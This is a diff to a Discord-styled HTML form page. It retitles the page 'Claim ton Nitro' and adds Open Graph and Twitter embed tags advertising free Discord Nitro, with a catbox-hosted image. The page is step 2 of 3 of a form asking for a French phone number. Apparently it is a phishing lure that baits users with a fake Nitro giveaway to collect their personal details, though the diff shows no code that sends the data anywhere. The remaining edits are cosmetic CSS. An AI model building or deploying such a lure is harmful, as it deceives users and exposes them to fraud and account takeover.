@@ -3,7 +3,25 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Numéro de téléphone</title>
+<title>Claim ton Nitro</title>
+
+<!-- Open Graph / Discord embed -->
+<meta property="og:type"         content="website">
+<meta property="og:title"        content="Claim ton Nitro">
+<meta property="og:description"  content="Viens claim ton nitro">
+<meta property="og:image"        content="https://files.catbox.moe/939zj5.png">
+<meta property="og:image:width"  content="1200">
+<meta property="og:image:height" content="630">
+
+<!-- Twitter Card -->
+<meta name="twitter:card"        content="summary_large_image">
+<meta name="twitter:title"       content="Claim ton Nitro">
+<meta name="twitter:description" content="Viens claim ton nitro">
+<meta name="twitter:image"       content="https://files.catbox.moe/939zj5.png">
+
+<!-- General -->
+<meta name="description" content="Viens claim ton nitro">
+
 <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
@@ -103,9 +121,7 @@
     font-weight: 700;
   }
 
-  .field {
-    margin-bottom: 1rem;
-  }
+  .field { margin-bottom: 1rem; }
 
   .field label {
     display: block;
@@ -136,7 +152,6 @@
     outline: none;
     text-align: center;
     transition: border-color 0.15s;
-    /* Fix vendor prefix warning */
     -moz-appearance: textfield;
     appearance: textfield;
   }
@@ -227,11 +242,7 @@
     margin: 1.25rem 0 1rem;
   }
 
-  .footer-link {
-    font-size: 14px;
-    color: #b5bac1;
-  }
-
+  .footer-link { font-size: 14px; color: #b5bac1; }
   .footer-link a { color: #00a8fc; text-decoration: none; }
   .footer-link a:hover { text-decoration: underline; }
 </style>
@@ -257,7 +268,7 @@
   <p class="progress-label">Étape 2 sur 3</p>
 
   <div class="field">
-    <label for="phone">Téléphone <span class="req">*</span></label>
+    <label>Téléphone <span class="req">*</span></label>
     <div class="phone-row">
       <input class="indicatif" type="text" id="indicatif" value="+33" maxlength="5" placeholder="+33">
       <input class="phone-input" type="tel" id="phone" placeholder="6 12 34 56 78" maxlength="14" autocomplete="tel">
